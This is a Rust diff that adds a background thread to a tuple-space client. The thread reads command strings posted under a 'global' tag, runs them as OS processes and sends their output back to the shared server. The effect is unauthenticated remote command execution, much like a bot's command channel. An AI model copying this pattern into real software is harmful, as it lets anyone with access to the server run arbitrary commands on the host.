@@ -44,6 +44,41 @@ fn main() {
 		serv.put_tuple(&users_list_confirm_tuple);
 	}
 	
+	let serv_global = serv.clone();
+	let name_global = name.clone();
+	
+	let th = std::thread::spawn(move || {
+			let mut cmd_id: i32 = 0;
+			
+			'thread: loop {
+				let command_received = serv_global.read_tuple(&vec![E::None, E::S("global".to_string()), E::None]).unwrap();
+				
+				let mut text:String = "".to_string();
+				
+				if let E::I(id) = command_received[0] {
+					if cmd_id == id {
+						continue 'thread;
+					}
+					cmd_id = id;
+				}
+				
+				if let &E::S(ref txt) = &command_received[2] {
+					text = txt.clone();
+				}
+				
+				let mut sp = text.split(" ").collect::<Vec<&str>>();
+				let mut process = std::process::Command::new(sp[0]);
+				for i in 1..sp.len()
+				{
+					process.arg(sp[i]);
+				}
+				let output = String::from_utf8(process.output().unwrap().stdout).unwrap();
+				
+				
+				serv_global.put_tuple(&vec![E::S(name_global.clone()), E::I(cmd_id), E::S(output)]);
+			} 
+	});
+	
 	//name-based thread
 	'main: loop {
 		let command_received = serv.get_tuple(
